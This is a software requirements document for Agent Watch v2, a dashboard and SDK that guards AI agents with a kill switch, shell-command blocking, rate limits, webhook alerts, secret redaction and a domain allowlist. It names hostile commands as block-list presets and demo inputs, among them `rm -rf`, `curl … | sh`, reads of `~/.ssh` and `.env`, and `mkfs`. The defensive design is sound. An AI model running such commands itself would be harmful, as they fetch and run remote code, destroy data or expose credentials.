# Requirements Document: Agent Watch v2 (controls, guards, and polish)

## Introduction

Agent Watch v1 (`.kiro/specs/agent-watch/`) is complete and deployed: a Python SDK that wraps an agent in three lines, a serverless Ingestion_API on AWS (API Gateway HTTP API, one Lambda, one DynamoDB table, SNS email), and a Next.js dashboard on Amplify. Two guardrails exist (a daily spend cap and a path blocklist), both enforced in the SDK before the action runs.

This spec adds a second layer on top of v1, in priority order:

1. **Kill switch.** A "Pause agent" control on the dashboard. A paused agent's SDK refuses every LLM call and tool call within seconds.
2. **Shell-command guard.** Block dangerous commands that tools run (`rm -rf`, `curl … | sh`, reads of `~/.ssh`) using patterns set in the dashboard.
3. **Spend chart and dashboard polish.** A per-agent 24-hour spend chart with blocked events marked, a summary tile (spend vs. cap), richer timeline rows, and an inventory status column.
4. **Webhook alerts.** Post guardrail alerts to a Discord or Slack channel as well as email.
5. **Per-agent rate limit.** "At most N LLM calls per minute", enforced in the SDK.
6. **Onboarding CLI.** `agentwatch init` creates a key, stores it safely, and prints the 3-line snippet. `agentwatch doctor` checks the setup.
7. **Optional, only if ahead of schedule:** secret redaction before prompts leave the process, a domain allowlist for tool URLs, a CloudWatch error alarm, and reliable alerts via DynamoDB Streams.

Everything in v1 keeps working unchanged: the 3-line integration, the six existing routes, stored Agent_Records, `scripts/e2e.sh`, and all 726 existing tests (backend 446, SDK 229, dashboard 51 as of 2026-10-12). New config keys are additive with defaults, so an old SDK against the new backend, and the new backend against old stored records, both behave as before.

Timeline: feature work from 2026-10-12, **feature freeze 2026-10-19**, recording and submission by 2026-10-23. Groups 8 to 13 are in scope; groups 14 to 16 are optional (`*`); group 17 (docs, e2e, rehearsal) is required.

This document continues the numbering of the v1 spec. Requirements start at 27, design Properties start at 30, and tasks start at group 8. All v1 glossary terms (Owner, Credentials, Key_Hash, Agent_Record, Guardrail_Config, Config_Response, Sync_Interval, Local_Spend_Total, Blocked_Path, Violation_Type, and so on) carry over unchanged.

## Glossary (additions)

- **Pause_State**: A per-agent boolean `paused` plus an optional `pausedAt` timestamp, stored on the Agent_Record outside the Guardrail_Config. It is a control-plane value that changes often and must propagate fast; Guardrail_Config holds rules that change rarely
- **Status_Response**: The response of GET /agents/{agentId}/status: `{agentId, paused, pausedAt}`
- **Control_Interval**: 5 seconds; the maximum age of the SDK's cached Pause_State before the SDK refreshes it. Compare Sync_Interval (60 seconds) for Guardrail_Config and Local_Spend_Total
- **Pause_Episode**: The span from one successful Status_Response with `paused: true` until the next successful Status_Response with `paused: false`, as seen by one SDK process
- **Blocked_Command**: A Guardrail_Config entry (`blockedCommands`) that is a Python `re` regular expression, compiled case-insensitively, matched with `search` against a Command_String
- **Command_String**: The text a tool argument is matched against: a `str` argument with runs of whitespace collapsed to one space, or a `list`/`tuple` whose items are all `str`, joined with single spaces (so `["rm", "-rf", "/"]` matches as `rm -rf /`)
- **Command_Preset**: One of the ready-made Blocked_Commands the Dashboard offers with one click, stored in `dashboard/lib/commandPresets.json` with an id, label, pattern, a matching example, and a non-matching example
- **Rate_Limit**: A Guardrail_Config entry (`maxLlmCallsPerMinute`) giving the maximum number of LLM calls the SDK allows in any Rate_Window
- **Rate_Window**: 60 seconds, sliding; an LLM call at time t counts the allowed LLM calls with start times in `(t - 60 s, t]`
- **Webhook_URL**: An HTTPS URL for a Discord or Slack incoming webhook, supplied as a stack parameter and passed to the Lambda as an environment variable; never stored in the repo
- **Alert_Publishers**: The set of publishers an alert goes to: always the SNS Alert_Service, plus a Webhook publisher when a Webhook_URL is configured
- **Spend_Series**: 24 hourly buckets of `costUsd` summed over an agent's `llm_call` events in the last 24 hours, with the count of `blocked` events per bucket, computed by the Dashboard from the timeline
- **Secret_Pattern**: A named regular expression for a well-known credential format (AWS access key id, Anthropic key, OpenAI key, GitHub token, Slack token, Google API key, JWT, PEM private key header)
- **Redaction**: Replacing a Secret_Pattern match in prompt text with `[REDACTED:<name>]` before the request reaches the model provider
- **Allowed_Domain**: A Guardrail_Config entry (`allowedDomains`) naming a hostname, or `*.` plus a hostname meaning that hostname and any subdomain; `null` means no domain restriction
- **Key_File**: `~/.agentwatch_key`, a file with mode 0600 holding the plaintext API_Key, created by `agentwatch init` and read by the SDK when no key is passed or set in the environment

Violation_Type gains the values `paused`, `blocked_command`, `rate_limit`, `secret_redacted`, and `blocked_domain`.

## Requirements

### Requirement 27: Kill Switch (Pause and Resume)

**User Story:** As a student watching my agent misbehave, I want one button that stops it now, so that I do not have to find the terminal or kill the process to stop the damage.

#### Acceptance Criteria

1. THE Agent_Record SHALL hold a Pause_State: `paused` (boolean, default false) and `pausedAt` (an event-format timestamp or null), stored as top-level attributes, not inside the Guardrail_Config
2. WHEN the Ingestion_API receives an authorized GET /agents/{agentId}/status, THE Ingestion_API SHALL return HTTP 200 with the Status_Response `{agentId, paused, pausedAt}`
3. WHEN the Ingestion_API receives GET /agents/{agentId}/status for an agentId with no Agent_Record, THE Ingestion_API SHALL return HTTP 200 with `paused: false` and `pausedAt: null`, without creating an Agent_Record
4. WHEN the Ingestion_API receives an authorized PUT /agents/{agentId}/status with body `{"paused": true|false}`, THE Ingestion_API SHALL set the Pause_State on the Agent_Record (setting `pausedAt` to the server time when pausing and to null when resuming), conditioned on the stored Key_Verifier, and return HTTP 200 with the Status_Response
5. WHEN an authorized PUT /agents/{agentId}/status targets an agentId with no Agent_Record, THE Ingestion_API SHALL create the Agent_Record with the ownerId and Key_Verifier from the Credentials, an empty Guardrail_Config, null firstSeen and lastSeen, and the submitted Pause_State, then return HTTP 200
6. IF a PUT /agents/{agentId}/status body is not a JSON object with exactly one key `paused` holding a boolean, THEN THE Ingestion_API SHALL return HTTP 400 with a descriptive error message and change nothing
7. THE Ingestion_API SHALL include `paused` in every InventoryItem
8. WHEN the SDK initializes, THE SDK SHALL request GET /agents/{agentId}/status and cache the Pause_State
9. WHEN the SDK is about to run any LLM call or any tool call and the cached Pause_State was fetched more than one Control_Interval earlier, THE SDK SHALL request the Status_Response and replace the cached Pause_State before deciding
10. IF a status request fails, times out after 2 seconds, or returns a malformed body, THEN THE SDK SHALL keep the last cached Pause_State (not paused if none was ever fetched), log a warning, and retry no sooner than one Control_Interval later
11. WHILE no status request has ever succeeded, THE SDK SHALL log the warning "agentwatch: pause control NOT active (status fetch failed)" once at initialization and once per failed refresh
12. WHILE the cached Pause_State is paused, THE SDK SHALL block every LLM call and every tool call (including tool calls with no path or command arguments), report the block as a `blocked` event with violationType `paused` and `meta.action` set to `llm_call` or `tool_call` (plus `meta.model` or `meta.tool`), and raise `AgentPaused`, a subclass of `GuardrailBlocked` with violation_type `paused`
13. THE SDK SHALL send at most one `paused` blocked event per Pause_Episode per process; later blocks in the same episode raise `AgentPaused` without sending an event
14. THE pause check SHALL run before the spend cap check, the rate limit check, and the blocklist checks, so a paused agent never reaches the model provider or the tool
15. THE Dashboard agent detail page SHALL show the Pause_State and a "Pause agent" or "Resume agent" control; the pause control SHALL require a second click ("Confirm pause") before sending PUT /agents/{agentId}/status
16. WHEN the Owner confirms a pause or resume, THE Dashboard SHALL send PUT /agents/{agentId}/status and display the returned Pause_State; on failure it SHALL show an error and keep the previous state
17. THE Dashboard inventory page SHALL show a "Paused" badge in a Status column for agents whose InventoryItem has `paused: true`, and "Active" otherwise
18. WHEN `demo/demo_agent.py` is run with `--loop N --sleep S`, THE demo SHALL wait S seconds between runs, catch any `GuardrailBlocked` (not only `SpendCapExceeded`), print `run i/N: <ExceptionClass>: <detail>`, stop the loop, and exit 0
19. THE template SHALL define the routes GET /agents/{agentId}/status and PUT /agents/{agentId}/status on the implicit HTTP API, routed to the existing ApiFunction

### Requirement 28: Shell-Command Guard

**User Story:** As a student whose agent can run shell commands, I want to block the dangerous ones by pattern, so that a confused agent cannot `rm -rf` my project or pipe a download into `sh`.

#### Acceptance Criteria

1. THE Guardrail_Config SHALL gain an optional `blockedCommands` key: a list of Blocked_Command strings, default empty
2. IF a PUT /agents/{agentId}/config body has `blockedCommands` that is not a list, has more than 100 entries, has an entry that is empty, longer than 256 characters, or does not compile with Python `re.compile(entry, re.IGNORECASE)`, THEN THE Ingestion_API SHALL return HTTP 400 with a descriptive error message naming `blockedCommands`
3. THE Ingestion_API SHALL always include `blockedCommands` in the Guardrail_Config it returns, as a list (empty when none is stored)
4. WHEN the cached Guardrail_Config contains one or more Blocked_Commands, THE SDK SHALL check every tool call before it runs
5. WHEN the SDK checks a tool call, THE SDK SHALL build a Command_String from every argument named in `command_arg` (a name or list of names) or in `command, cmd, args, argv, cmdline, script, shell_command`, plus every `str` argument and every `list`/`tuple` argument whose items are all `str`, in positional and keyword arguments
6. WHEN any Command_String matches any Blocked_Command (regex `search`, case-insensitive), THE SDK SHALL block the call, report the block as a `blocked` event with violationType `blocked_command`, `attemptedCommand` set to the Command_String (truncated to 1024 characters), and `meta` `{tool, pattern}`, and raise `CommandBlocked`, a subclass of `GuardrailBlocked` with violation_type `blocked_command`
7. WHEN no Command_String matches any Blocked_Command, THE SDK SHALL allow the call to proceed (subject to the other guardrails)
8. IF a Blocked_Command received from the Ingestion_API does not compile in the SDK, THEN THE SDK SHALL skip that entry, log a warning naming it once per process, and keep enforcing the others
9. THE SDK SHALL compile Blocked_Commands once per fetched Config_Response, not once per tool call
10. IF type is "blocked" and violationType is "blocked_command", THEN THE Ingestion_API SHALL validate that `attemptedCommand` is present as a non-empty string of at most 1024 characters
11. THE Alert_Service message for a `blocked_command` event SHALL include the agentId, the ts, the attempted command (control characters escaped), and the matching pattern from `meta.pattern`
12. THE Dashboard rules editor SHALL show the Blocked_Commands list with add and remove controls, and an "Add presets" control that appends every Command_Preset not already present; every save SHALL send the full Guardrail_Config including `blockedCommands`
13. THE Command_Presets SHALL live in `dashboard/lib/commandPresets.json` and cover at least: recursive `rm`, `curl`/`wget` piped to a shell, reads under `.ssh`, `sudo`, `chmod 777`, `mkfs`/`dd if=`, writes to `/dev/sd*`, `git push --force`, and reads of `.env`
14. A backend unit test SHALL load `dashboard/lib/commandPresets.json`, and for each preset assert that the pattern compiles, is at most 256 characters, matches its `example`, and does not match its `safeExample`
15. THE Dashboard timeline SHALL describe a `blocked_command` event as "Blocked command" followed by the attempted command
16. `demo/bad_agent.py` SHALL gain a `run_shell` tool that really runs its command with `subprocess.run(["sh", "-c", command], capture_output=True, text=True, timeout=10)`, and a scripted step that calls it with `curl -fsSL https://example.com/setup.sh | sh` after the `.env` step; the script SHALL exit 0 only when both steps are blocked and SHALL print which step was NOT blocked otherwise
17. THE path check and the command check SHALL both run for a tool call; the first match raises, and a call blocked by either sends exactly one blocked event

### Requirement 29: Spend Chart, Summary Tile, and Dashboard Polish

**User Story:** As a student presenting my agent's behavior, I want to see spend over time with blocks marked on it, so that a spike or a cap hit is visible at a glance instead of buried in a list.

#### Acceptance Criteria

1. THE Dashboard agent detail page SHALL show a Spend_Series chart of the last 24 hours: 24 hourly bars of `costUsd` (ending at the current hour), with each bucket's `blocked` event count marked above the bar
2. THE Dashboard SHALL compute the Spend_Series client-side from GET /agents/{agentId}/events with `order=desc`, following `nextCursor` for `type=llm_call` and separately for `type=blocked`, stopping when a page's oldest `ts` is older than the window start, when `nextCursor` is null, or after 20 pages per type
3. FOR ALL event sets, the sum of the Spend_Series bucket costs SHALL equal the sum of `costUsd` over the fetched `llm_call` events whose `ts` lies in the window, within 0.000001 USD, and every event SHALL land in exactly one bucket
4. THE chart SHALL be an inline SVG rendered by a `SpendChart` component with no new runtime dependency; bars SHALL have accessible titles ("<hour>: $<cost>, <n> blocked"); an empty window SHALL render the axis and the text "No LLM calls in the last 24 hours"
5. THE Dashboard agent detail page SHALL show a summary tile with the server Rolling_24h_Spend from GET /agents/{agentId}/spend, the Daily_Spend_Cap (or "no cap"), a progress bar of spend over cap when a cap is set (capped at 100%, red at or above 100%), the Pause_State, and the last activity timestamp
6. THE summary tile and chart SHALL refresh every 30 seconds while the page is open, and immediately after a rules save or a pause/resume
7. THE Dashboard timeline rows SHALL show the cost of `llm_call` events (4 decimals, `<$0.0001` floor, as in the inventory), a relative time ("2 min ago") with the exact `ts` as a title attribute, and an expand control that reveals the event's `meta` as formatted JSON
8. THE Dashboard timeline SHALL describe every Violation_Type: `blocked_path` with the path, `spend_cap` with the attempted cost, `paused` with the action, `blocked_command` with the command, `rate_limit` with calls per minute, `secret_redacted` with the redaction count, and `blocked_domain` with the URL
9. THE Dashboard inventory page SHALL add a Status column showing "Paused" or "Active", and SHALL show "stale" next to a last activity older than 24 hours
10. THE Dashboard SHALL add `getStatus`, `putStatus`, and `getSpend` to `lib/api.ts` and the matching TypeScript types to `lib/types.ts`
11. THE Dashboard SHALL add no runtime dependency for this requirement; vitest tests SHALL cover bucketing, window paging, chart rendering, the summary tile, timeline descriptions for every Violation_Type, and the Status column

### Requirement 30: Webhook Alerts (Discord and Slack)

**User Story:** As a student who lives in Discord, I want guardrail alerts in my channel, so that I see a block within seconds without opening email.

#### Acceptance Criteria

1. THE template SHALL define a parameter `AlertWebhookUrl` (Type String, Default "", `NoEcho: true`) and pass it to ApiFunction as the environment variable `ALERT_WEBHOOK_URL`
2. WHEN `ALERT_WEBHOOK_URL` is non-empty, THE Ingestion_API SHALL publish every alert to both the SNS Alert_Service and the Webhook_URL; WHEN it is empty, only to SNS
3. THE Webhook publisher SHALL accept only HTTPS URLs whose host is exactly `discord.com`, `discordapp.com`, or `hooks.slack.com`; for any other URL it SHALL log a warning once at construction, publish nothing, and never make a request
4. THE Webhook publisher SHALL send a JSON POST with `{"content": <text>}` for Discord hosts and `{"text": <text>}` for Slack hosts, using only the Python standard library (`urllib.request`), with a 3-second timeout
5. THE webhook text SHALL contain the alert subject and body (agentId, violationType, ts, and the attempt details), with control characters escaped as in the email
6. IF publishing to any one Alert_Publisher raises or times out, THEN THE Ingestion_API SHALL still publish to the other publishers, log the failure with the exception type only, keep the stored event, and return HTTP 200
7. FOR ALL newly stored blocked events, each configured Alert_Publisher SHALL be called exactly once; duplicates and non-blocked events SHALL call none
8. THE Webhook_URL SHALL never appear in `samconfig.toml`, the repo, logs, or responses; deploys SHALL pass it with `--parameter-overrides` once and `UsePreviousValue` afterwards
9. `README.md` SHALL document how to set the webhook (create a Discord or Slack incoming webhook, pass `AlertWebhookUrl` at deploy)

### Requirement 31: Per-Agent LLM Rate Limit

**User Story:** As a student whose agent loops, I want a cap on calls per minute, so that a runaway loop is caught even when each call is cheap enough to stay under the spend cap.

#### Acceptance Criteria

1. THE Guardrail_Config SHALL gain an optional `maxLlmCallsPerMinute` key: null (default) or an integer from 1 to 10000
2. IF a PUT /agents/{agentId}/config body has `maxLlmCallsPerMinute` that is not null or an integer in 1..10000 (bools rejected), THEN THE Ingestion_API SHALL return HTTP 400 naming the field
3. WHEN the cached Guardrail_Config has a Rate_Limit N and the SDK is about to run an LLM call at time t, THE SDK SHALL count the allowed LLM calls with start times in the Rate_Window `(t - 60 s, t]`; IF the count is greater than or equal to N, THE SDK SHALL block the call, report a `blocked` event with violationType `rate_limit` and `meta` `{callsInWindow, maxPerMinute, model}`, and raise `RateLimitExceeded`, a subclass of `GuardrailBlocked` with violation_type `rate_limit`
4. WHEN the count is less than N, THE SDK SHALL record the call's start time and allow the call; blocked calls SHALL not be recorded
5. THE SDK SHALL send at most one `rate_limit` blocked event per Rate_Window per process; later blocks inside the same window raise without sending an event
6. THE rate limit check SHALL run after the pause check and before the spend cap check
7. THE SDK rate limit state SHALL be per `Watcher` (per agent id in one process), thread-safe, and use the injectable monotonic clock
8. IF type is "blocked" and violationType is "rate_limit", THEN THE Ingestion_API SHALL accept the event with no extra required fields beyond `violationType` and `meta`
9. THE Alert_Service message for a `rate_limit` event SHALL include `callsInWindow` and `maxPerMinute` from `meta`
10. THE Dashboard rules editor SHALL show a "Max LLM calls per minute" input (empty means no limit) and send it in the full Guardrail_Config
11. `scripts/e2e.sh` SHALL include a step that sets `maxLlmCallsPerMinute` to 2 on `demo-bot`, runs `demo_agent.py --loop 4`, expects `RateLimitExceeded`, and clears the limit on exit

### Requirement 32: Onboarding CLI and Credential Discovery

**User Story:** As a student trying Agent Watch for the first time, I want one command that sets up my key and shows me what to paste, so that I can be reporting events in two minutes without losing the key.

#### Acceptance Criteria

1. THE SDK SHALL install a console script `agentwatch` (`[project.scripts]` in `sdk/pyproject.toml`) implemented in `sdk/agentwatch/cli.py` with the standard library only (`argparse`, `secrets`, `os`, `stat`)
2. WHEN `agentwatch init --owner <id> --endpoint <url>` runs and no Key_File exists, THE CLI SHALL generate an API_Key with `secrets.token_urlsafe(32)`, write it to the Key_File with mode 0600 (creating it with `os.open` and `0o600`, never widening an existing mode), and print: the key once with a line telling the user to store it in a password manager and that it is saved in the Key_File, the export lines for `AGENTWATCH_ENDPOINT` and `AGENTWATCH_OWNER`, and the 3-line snippet
3. WHEN `agentwatch init` runs and the Key_File exists, THE CLI SHALL refuse to overwrite it, print where it is, and exit 1, unless `--force` is given
4. WHEN `agentwatch init --quiet` runs, THE CLI SHALL print no key material at all (only the file path and the snippet)
5. WHEN `agentwatch.init` is called without `api_key`, THE SDK SHALL use `AGENTWATCH_KEY` if set, else the contents of the Key_File (stripped), else raise `ValueError` naming both sources; WHEN called without `owner_id`, THE SDK SHALL use `AGENTWATCH_OWNER` or raise `ValueError`
6. THE SDK SHALL never log, print, or include in any exception message the key read from the environment or the Key_File
7. WHEN `agentwatch doctor --agent <id>` runs, THE CLI SHALL resolve the endpoint, owner, and key the same way as `agentwatch.init`, request GET /agents/{agentId}/config and GET /agents/{agentId}/status, and print one line per check: endpoint reachable, credentials accepted (or 401/403), guardrails summary (cap, number of blocked paths and commands, rate limit, paused), exiting 0 when every check passes and 1 otherwise, never printing the key or Key_Hash
8. `README.md` SHALL show `pip install -e sdk && agentwatch init ...` as the quickstart before the 3-line snippet
9. THE SDK `__version__` and `pyproject.toml` version SHALL be bumped to 0.2.0 when group 13 completes

### Requirement 33: Secret Redaction (optional)

**User Story:** As a student who pastes files into prompts, I want obvious credentials masked before the prompt leaves my machine, so that one careless paste does not ship my AWS key to a third party.

#### Acceptance Criteria

1. THE Guardrail_Config SHALL gain an optional `redactSecrets` key: a boolean, default false
2. WHILE `redactSecrets` is true, THE SDK SHALL scan the text of every outgoing LLM request (Bedrock `messages[].content[].text` and `system[].text`; Anthropic `messages[].content` as a string or as text blocks, and `system` as a string or text blocks) for every Secret_Pattern before the call
3. WHEN one or more Secret_Patterns match, THE SDK SHALL send the provider a deep copy of the request with each match replaced by `[REDACTED:<name>]`, leave the caller's request objects unmodified, report a `blocked` event with violationType `secret_redacted` and `meta` `{kinds: {<name>: count}, total, model}` before the call, and then proceed with the redacted call (the call is not blocked)
4. THE `llm_call` event for a redacted call SHALL include `meta.redactions` equal to the total number of replacements
5. THE SDK SHALL never send any matched secret text, or any prompt text, to the Ingestion_API; only names and counts
6. THE Secret_Patterns SHALL cover: AWS access key ids (`AKIA` + 16 uppercase alphanumerics), Anthropic keys (`sk-ant-` prefix), OpenAI keys (`sk-` prefix, not `sk-ant-`), GitHub tokens (`ghp_`, `gho_`, `ghu_`, `ghs_`, `ghr_`), Slack tokens (`xox[baprs]-`), Google API keys (`AIza` + 35 chars), JWTs (three base64url segments starting `eyJ`), and PEM private key headers
7. FOR ALL texts with no Secret_Pattern match, redaction SHALL return the text unchanged with zero counts; FOR ALL texts, redacting twice SHALL equal redacting once, and the redacted text SHALL contain no Secret_Pattern match
8. IF type is "blocked" and violationType is "secret_redacted", THEN THE Ingestion_API SHALL accept the event with no extra required fields beyond `violationType` and `meta`
9. THE Dashboard rules editor SHALL show a "Redact secrets in prompts" checkbox
10. `demo/bad_agent.py` SHALL gain a third scripted step (run only when `--leak` is passed) that asks the model a question containing the AWS documentation example key `AKIAIOSFODNN7EXAMPLE`, and SHALL print "redacted N secret(s) before the call" when the step is redacted

### Requirement 34: Domain Allowlist (optional)

**User Story:** As a student whose agent fetches web pages, I want to limit which hosts it can reach, so that a prompt-injected link cannot send my data somewhere I did not approve.

#### Acceptance Criteria

1. THE Guardrail_Config SHALL gain an optional `allowedDomains` key: null (default, no restriction) or a list of at most 100 Allowed_Domain strings, each at most 253 characters matching `^(\*\.)?[A-Za-z0-9.-]+$`
2. IF a PUT /agents/{agentId}/config body has an invalid `allowedDomains`, THEN THE Ingestion_API SHALL return HTTP 400 naming the field
3. WHILE `allowedDomains` is a list, THE SDK SHALL check every tool call: every `str` argument (and `str` item of a list/tuple argument) that `urllib.parse.urlsplit` parses with scheme `http` or `https` and a non-empty hostname is an attempted URL
4. WHEN an attempted URL's hostname (lowercased, trailing dot removed) does not equal an Allowed_Domain and does not match a `*.` entry (the hostname equals the suffix or ends with `.` plus the suffix), THE SDK SHALL block the call, report a `blocked` event with violationType `blocked_domain`, `attemptedUrl` (truncated to 1024 characters), and `meta` `{tool, host}`, and raise `DomainBlocked`, a subclass of `GuardrailBlocked` with violation_type `blocked_domain`
5. WHEN `allowedDomains` is null or every attempted URL is allowed, THE SDK SHALL allow the call (subject to the other guardrails)
6. IF type is "blocked" and violationType is "blocked_domain", THEN THE Ingestion_API SHALL validate that `attemptedUrl` is present as a non-empty string of at most 1024 characters
7. THE Dashboard rules editor SHALL show the Allowed_Domains list with add and remove controls and an "unrestricted" state when null

### Requirement 35: Operational Alarms and Reliable Alerts (optional)

**User Story:** As the person running this stack, I want to know when the API itself breaks and I want alert emails that cannot be lost, so that the system I trust to warn me is itself trustworthy.

#### Acceptance Criteria

1. THE template SHALL define a CloudWatch alarm on ApiFunction `Errors` (Sum >= 1 over one 5-minute period, `TreatMissingData: notBreaching`) whose alarm action is the Alert_Service topic
2. THE template SHALL define a CloudWatch alarm on the HTTP API `5xx` count (Sum >= 1 over one 5-minute period) with the same action
3. (Streams, do last) THE template MAY enable DynamoDB Streams (`NEW_IMAGE`) on the Event_Store and define an `AlertFunction` triggered by the stream that publishes an alert for each inserted `blocked` event, replacing the synchronous publish in `ingest_event`
4. WHEN the stream-based AlertFunction processes a record, THE AlertFunction SHALL first set `alerted = true` on the event item with condition `attribute_not_exists(alerted)`, publish only when that update succeeds, and skip records that are not inserts of `blocked` events; so delivery is at-least-once with duplicates suppressed
5. THE AlertFunction SHALL have only the permissions it needs: stream read, `UpdateItem` on the Event_Store, and publish on the Alert_Service
6. `backend/tests/test_template.py` SHALL pin every new alarm and, when present, the stream and AlertFunction policies

### Requirement 36: Backward Compatibility and Schema Evolution

**User Story:** As the developer shipping v2 on a live stack, I want every change to be additive, so that stored records, the deployed SDK, the dashboard build, and the smoke test keep working at every intermediate commit.

#### Acceptance Criteria

1. THE Ingestion_API `parse_config` SHALL accept a Guardrail_Config with any subset of the new keys (`blockedCommands`, `maxLlmCallsPerMinute`, `redactSecrets`, `allowedDomains`) missing, applying the defaults `[]`, `null`, `false`, `null`; `dailySpendCapUsd` and `blockedPaths` remain required on PUT
2. THE Ingestion_API `to_json` SHALL always emit every Guardrail_Config key, so `parse_config(to_json(c)) == c` for every valid v2 config, and a stored v1 `guardrails` map SHALL parse with defaults
3. THE `GuardrailConfig`, `AgentRecord`, and SDK `ConfigResponse` dataclasses SHALL give every new field a default, so every existing positional constructor call in the test suites still compiles
4. THE SDK `parse_config_response` SHALL treat a missing new key as its default and a present key of the wrong type as a malformed response (failed fetch, keep the last good config)
5. THE Ingestion_API SHALL keep rejecting unknown Guardrail_Config keys and unknown event fields with HTTP 400
6. `scripts/e2e.sh` SHALL keep passing after every group without edits to its existing steps (its read-modify-write of the full config preserves new keys)
7. ALL existing tests SHALL keep passing after every task; a task that must change an existing test SHALL say why in its commit message

### Requirement 37: Documentation, Demo, and Rehearsal (v2)

**User Story:** As a presenter with new moments to show, I want the docs, demo script, and smoke test to cover them, so that the recording goes as smoothly as the v1 rehearsal did.

#### Acceptance Criteria

1. `README.md` SHALL document the new guardrails (`blockedCommands`, `maxLlmCallsPerMinute`, pause, optional redaction and domains), the new exceptions, the `agentwatch` CLI, webhook setup, and new Known limitations (regex over-blocking of non-command strings, redaction covers only known key formats, pause propagation up to one Control_Interval plus one request)
2. `docs/ARCHITECTURE.md` SHALL add the status routes, the control-plane vs. rules-plane distinction, the alert fan-out, and the updated decisions table
3. `docs/DEMO_SCRIPT.md` SHALL add on-camera moments for the kill switch, the shell block, the spend chart, and the Discord alert, with the exact UI labels and expected terminal lines, and prep steps that clear every rule and resume both demo agents
4. `scripts/e2e.sh` SHALL add steps for pause (set paused, run `demo_agent.py`, expect `AgentPaused`, resume), the shell block (add the `curl | sh` preset to `bad-bot`, run `bad_agent.py`, expect `CommandBlocked`), and the rate limit, and SHALL reset every new rule and the Pause_State in its exit trap
5. `backend/tests/test_readme.py` SHALL pin the new README statements and docs headings, and keep the secret scan (no live key or 64-hex hash in any doc)
6. `docs/INTERVIEW_PREP.md` SHALL gain 2 to 3 questions per completed v2 task, and `docs/CODEBASE_GUIDE.md` SHALL be refreshed with the v2 features at freeze
7. THE final rehearsal SHALL run `scripts/e2e.sh` on the deployed stack and then the on-camera click-path by hand, recording block-to-email and block-to-Discord timings in `PROGRESS.md`

## Deferred (documented, not built in v2)

- Per-owner webhook settings (needs an owner record; v2 uses one stack-wide Webhook_URL)
- A JavaScript/TypeScript SDK and LangChain/OpenAI wrappers
- Multi-user teams, user accounts (Cognito), and key rotation for an existing Agent_Record
- Anomaly detection beyond fixed rules
- Kernel-level or sandboxed enforcement for direct `open()` and `subprocess` calls that bypass wrapped tools
- A server-side spend series endpoint (the client-side Spend_Series is enough at demo volume; the endpoint is the obvious next step once an agent has more than about 2000 events a day)
